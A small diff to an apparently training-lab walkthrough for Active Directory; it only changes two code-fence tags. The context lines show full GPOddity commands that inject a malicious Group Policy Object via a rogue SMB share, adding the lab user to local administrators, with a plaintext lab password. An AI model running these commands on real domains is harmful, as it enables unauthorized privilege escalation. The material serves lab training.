@@ -76,7 +76,7 @@ LDAP server claims to have taken the secdescriptor. Have fun
 
 Stop the ldap shell and ntlmrelayx using Ctrl + C.
 Now, run the GPOddity command to create the new template.
-```batch
+```bash
 cd /mnt/c/AD/Tools/GPOddity
 sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domain 'dollarcorp.moneycorp.local' --username 'studentx' --password 'gG38Ngqym2DpitXuGrsJ' --command 'net localgroup administrators studentx /add' --rogue-smbserver-ip '172.16.100.x' --rogue-smbserver-share 'stdx-gp' --dc-ip '172.16.2.1' --smb-mode none
 ```
@@ -157,7 +157,7 @@ write_gpo_dacl studentx {0BF8D01C-1F62-4BDC-958C-57140B67D147}
 Now malicious GPO template can injected through GPOddity - [https://github.com/synacktiv/GPOddity](https://github.com/synacktiv/GPOddity)
 
 ##### In linux machine change to the tool directory
-```batch
+```md
 cd /mnt/c/AD/Tools/GPOddity
 # Use the GPOddity
 sudo python3 gpoddity.py --domain dollarcorp.moneycorp.local --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --username studentx --password xyzdsfsddsf --dc-ip 172.16.2.1 --command "net localgroup administrators studentx  /add" --rogue-smbserver-ip 172.16.100.x --rogue-smbserver-share 'std-anything' --smb-mode none 
